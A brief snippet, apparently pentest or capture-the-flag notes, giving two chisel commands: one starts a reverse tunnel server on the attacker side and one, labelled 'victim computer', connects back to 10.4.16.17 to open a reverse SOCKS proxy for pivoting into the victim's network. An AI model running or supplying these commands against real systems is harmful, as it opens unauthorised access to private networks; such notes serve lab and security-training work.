```bash
./chisel server -p 9001 --reverse &
```
victim computer
```bash
./chisel client 10.4.16.17:9001 R:socks &
```
